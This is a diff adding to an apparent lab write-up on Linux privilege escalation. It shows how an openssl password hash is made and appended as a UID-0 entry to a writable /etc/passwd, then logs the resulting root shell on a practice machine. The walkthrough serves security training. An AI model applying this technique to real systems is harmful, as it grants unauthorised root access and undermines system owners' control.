@@ -192,13 +192,64 @@ First, let's exit out of root from our previous task by typing "exit". Then use 
 Having read the information above, what direction privilege escalation is this attack?
 Ans. Vertical
 
+=========
+at this point, the machine broke; ssh connection refused
+new IP: 10.10.154.204
 
 
+export IP = 10.10.154.204
+
+ssh user3@10.10.154.204
 
 
+Before we add our new user, we first need to create a compliant password hash to add! We do this by using the command: "openssl passwd -1 -salt [salt] [password]"
+
+What is the hash created by using this command with the salt, "new" and the password "123"?
+Ans. $1$new$p7ptkEKU1HnaHpRtzNizS1
+
+```
+┌──(kali㉿kali)-[~/ken/brainstack/privesec]
+└─$ openssl passwd -1 -salt new 123
+$1$new$p7ptkEKU1HnaHpRtzNizS1
+
+```
+
+Great! Now we need to take this value, and create a new root user account. What would the /etc/passwd entry look like for a root user with the username "new" and the password hash we created before?
+
+new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
 
 
+Great! Now you've got everything you need. Just add that entry to the end of the /etc/passwd file!
 
 
+```
+
+user7@polobox:/home/user3$ sudo nano /etc/passwd
+[sudo] password for user7: 
+user7 is not in the sudoers file.  This incident will be reported.
+user7@polobox:/home/user3$ nano /etc/passwd
+
+# insert new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash at the end of the file
+
+user7@polobox:/home/user3$ su new
+Password: 
+Welcome to Linux Lite 4.4
+ 
+You are running in superuser mode, be very careful.
+ 
+Wednesday 10 August 2022, 09:50:31
+Memory Usage: 335/1991MB (16.83%)
+Disk Usage: 6/217GB (3%)
+
+root@polobox:/home/user3# whoami
+root
+root@polobox:/home/user3# pwd
+/home/user3
+root@polobox:/home/user3# 
+
+```
+
+
+Now, use "su" to login as the "new" account, and then enter the password. If you've done everything correctly- you should be greeted by a root prompt! Congratulations!
 
 
